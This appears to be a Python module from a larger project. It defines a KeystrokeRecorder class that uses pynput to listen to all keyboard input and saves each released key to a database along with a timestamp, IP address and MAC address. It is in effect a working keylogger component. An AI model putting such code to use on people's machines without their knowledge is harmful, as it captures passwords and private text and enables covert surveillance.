import pynput
from src.db.KeystrokeDAO import KeystrokeDAO
from src.models.Keystroke import Keystroke
from src.models.recorder import Recorder


class KeystrokeRecorder(Recorder):
    def __init__(self):
        self.keystroke_collection = KeystrokeDAO()
        self.listener = pynput.keyboard.Listener(on_release=self.on_release)
        self.listener.start()

    def on_release(self, key):
        try:
            self.save_keystroke(str(key.char))
        except AttributeError:
            self.save_keystroke(str(key)[4:])

    def save_keystroke(self, key):
        time = super().get_timestemp()
        ip = super().get_ip()
        mac = super().get_mac()
        self.keystroke_collection.create(Keystroke(key, time, ip, mac, []))

    def stop(self):
        self.listener.stop()
        
    def start(self):
        self.listener.start()
